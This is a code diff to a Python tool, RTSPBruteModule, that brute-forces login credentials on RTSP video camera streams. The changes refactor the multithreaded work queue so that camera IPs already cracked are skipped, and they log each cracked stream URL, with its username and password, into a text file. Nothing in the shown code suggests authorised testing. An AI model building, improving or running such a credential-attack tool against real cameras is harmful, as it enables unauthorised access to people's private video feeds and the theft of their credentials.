@@ -2,13 +2,11 @@ import logging
 import socket
 import base64
 import concurrent.futures
-import itertools
 import argparse
 import time
 import cv2
-from queue import Queue
-from common import cargar_datos, guardar_datos
 import os
+import queue
 
 logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
 
@@ -19,7 +17,7 @@ class RTSPBruteModule:
         self.pause_duration = 1
         self.max_threads = 50
         self.timeout = 5
-        self.seen_urls = set()
+        self.seen_ips = set()
 
     def setup(self, targets, dictionary_file, pause_duration=1, max_threads=50, timeout=5):
         self.targets = targets
@@ -40,17 +38,32 @@ class RTSPBruteModule:
         total_targets = len(self.targets)
         logging.info(f"[*] Total targets: {total_targets}")
 
-        queue = Queue()
-
-        for target in self.targets:
-            for credential in self.credentials:
-                queue.put((target, credential))
+        queue_instance = self.generate_queue()
 
         with concurrent.futures.ThreadPoolExecutor(max_workers=self.max_threads) as executor:
-            while not queue.empty():
-                executor.submit(self.brute_force, queue.get())
+            while not queue_instance.empty():
+                executor.submit(self.brute_force, queue_instance.get())
 
         logging.info("[*] Finished all threads")
+
+    def generate_queue(self):
+        queue_instance = queue.Queue()
+
+        # Cargamos las IPs ya vistas desde el archivo
+        if os.path.exists("RTSPCONECT.txt"):
+            with open("RTSPCONECT.txt", "r") as file:
+                lines = file.readlines()
+                for line in lines:
+                    ip = line.split('@')[1].split(':')[0]
+                    self.seen_ips.add(ip)
+
+        for target in self.targets:
+            ip, port = target
+            if ip not in self.seen_ips:
+                for credential in self.credentials:
+                    queue_instance.put((target, credential))
+
+        return queue_instance
 
     def rtsp_request(self, target, credential):
         ip, port = target
@@ -104,7 +117,7 @@ class RTSPBruteModule:
                     break
             cap.release()
             cv2.destroyAllWindows()
-            self.save_url(url)  # Save the URL only if the stream is successfully displayed
+            self.save_url(url)
             return True
         else:
             logging.error(f"Failed to open video stream from {url}")
@@ -112,13 +125,14 @@ class RTSPBruteModule:
 
     def save_url(self, url):
         ip = url.split('@')[1].split(':')[0]
+        logging.info(f"Saving URL: {url}")
         if not os.path.exists("RTSPCONECT.txt"):
             open("RTSPCONECT.txt", 'w').close()
 
         with open("RTSPCONECT.txt", "r") as file:
             lines = file.readlines()
 
-        # Eliminar duplicados
+        # Eliminar duplicados y verificar si la IP ya está en la lista
         new_lines = []
         seen_ips = set()
         for line in lines:
@@ -130,11 +144,10 @@ class RTSPBruteModule:
         # Agregar nuevo URL si la IP no existe
         if ip not in seen_ips:
             new_lines.append(url + '\n')
+            self.seen_ips.add(ip)
         
         with open("RTSPCONECT.txt", "w") as file:
             file.writelines(new_lines)
-        
-        self.seen_urls.add(url)
 
     def brute_force(self, task):
         target, credential = task
